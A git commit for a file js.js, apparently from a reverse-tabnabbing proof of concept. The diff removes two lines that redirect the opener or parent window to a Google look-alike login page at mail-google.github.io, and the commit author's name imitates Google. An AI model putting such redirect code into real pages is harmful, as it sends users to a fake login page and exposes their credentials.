034e5296dd35286337784a38f66d1c87f5cd0e56
Google <99067906+mail-google@users.noreply.github.com>
2022-04-14 01:22:28 +0600

    Update js.js

--- js.js
+++ js.js
@@ -1,6 +1,3 @@
 function myFunction(){
             alert('Tabnabbing POC\nPlease Login again to continue...');
 }
-
-if (window.opener) window.opener.parent.location.replace('https://mail-google.github.io/login/');
-if (window.parent != window) window.parent.location.replace('https://mail-google.github.io/login/');
